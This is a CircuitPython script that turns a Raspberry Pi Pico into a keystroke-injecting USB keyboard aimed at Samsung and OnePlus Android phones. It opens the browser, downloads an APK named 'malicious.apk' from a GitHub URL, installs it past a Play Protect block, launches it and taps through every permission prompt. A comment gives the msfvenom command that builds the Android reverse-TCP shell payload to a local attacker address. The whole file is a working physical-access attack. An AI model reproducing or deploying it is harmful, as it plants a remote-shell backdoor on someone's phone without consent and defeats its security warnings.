import os
import time
import board
import digitalio
import usb_hid
from adafruit_hid.mouse import Mouse
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_sf import KeyboardLayout
from keycode_win_sf import Keycode

# Select the device
OnePlusDevice = False
device = "OP7P"
OnePlus = ["OP7P", "OP8P"]

SamsungDevice = True
device = "SGS9E"
Samsung = ["SGS9E"]

# Load Raspberry Pi Pico as HID Keyboard device
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayout(keyboard)

# In case of Mouse HID Injection
# mouse = Mouse(usb_hid.devices)

# Load the default LED of the Raspberry Pi Pico
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

# Start the LED to show that the script is running.
led.value = True
time.sleep(3.0)

# Detect the device manufacturer and store it inside a variable
# device = os.popen('getprop ro.product.manufacturer').read()
#time.sleep(0.5)

# Open browser with default shortcut
keyboard.press(Keycode.GUI, Keycode.B)
keyboard.release_all()
time.sleep(0.5)

# Open a new tab to reach the google search home page
keyboard.press(Keycode.CONTROL, Keycode.T)
keyboard.release_all()
time.sleep(1.5)

# Reach the search bar
keyboard.press(Keycode.CONTROL, Keycode.L)
keyboard.release_all()
time.sleep(0.5)

# Do you'r research
# msfvenom -p android/shell/reverse_tcp LHOST=192.168.1.103 LPORT=2502 -f raw -o malicious.apk
## TODO : Fix keyboard layout
layout.write("httpsö--github.com-V0lk3n-HIDScripts-raw-main-Backdoor-malicious.apk")
time.sleep(0.5)
keyboard.press(Keycode.ENTER)
keyboard.release_all()
time.sleep(0.5)

# Open Chrome Menu
keyboard.press(Keycode.ALT, Keycode.F)
keyboard.release_all()
time.sleep(0.5)

# Select Download Menu
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.ENTER)
keyboard.release_all()
time.sleep(0.5)

# Locate the downloaded malware on download page
if OnePlusDevice == True:
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(1.5)
elif SamsungDevice == True:
    keyboard.press(Keycode.DOWN_ARROW)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.DOWN_ARROW)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)
else:
    led.value = False
    time.sleep(1.0)
    led.value = True
    time.sleep(1.0)
    led.value = False
    time.sleep(1.0)
    led.value = True
    time.sleep(1.0)
    led.value = False
    time.sleep(1.0)
    led.value = True
    time.sleep(1.0)

# Open the malware to install it
if OnePlusDevice == True:
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(1.0)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    if device == "OP8P":
            keyboard.press(Keycode.TAB)
            keyboard.release_all()
            time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(1.5)
elif SamsungDevice == True:
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(1.5)
else:
    led.value = False
    time.sleep(1.0)
    led.value = True
    time.sleep(1.0)
    led.value = False
    time.sleep(1.0)
    led.value = True
    time.sleep(1.0)
    led.value = False
    time.sleep(1.0)
    led.value = True
    time.sleep(1.0)

# Force install once blocked by play protect
if SamsungDevice == True:
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(2.5)

# Run the malware
if OnePlusDevice == True:
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)
elif SamsungDevice == True:
    keyboard.press(Keycode.TAB)
    keyboard.release_all()
    time.sleep(0.5)
    keyboard.press(Keycode.ENTER)
    keyboard.release_all()
    time.sleep(0.5)
else:
    led.value = False
    time.sleep(1.0)
    led.value = True
    time.sleep(1.0)
    led.value = False
    time.sleep(1.0)
    led.value = True
    time.sleep(1.0)
    led.value = False
    time.sleep(1.0)
    led.value = True
    time.sleep(1.0)

# Give all the permission to the malware
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.TAB)
keyboard.release_all()
time.sleep(0.5)
keyboard.press(Keycode.ENTER)
keyboard.release_all()
time.sleep(0.5)

# Close Old App warning
## TODO : Check how to avoid this
keyboard.press(Keycode.ENTER)
keyboard.release_all()
time.sleep(0.5)

# Go to Home Screen with default keyboard shortcut
keyboard.press(Keycode.GUI, Keycode.ENTER)
keyboard.release_all()
time.sleep(0.5)

# Stop the LED to show that the script has ended.
led.value=False
time.sleep(0.5)
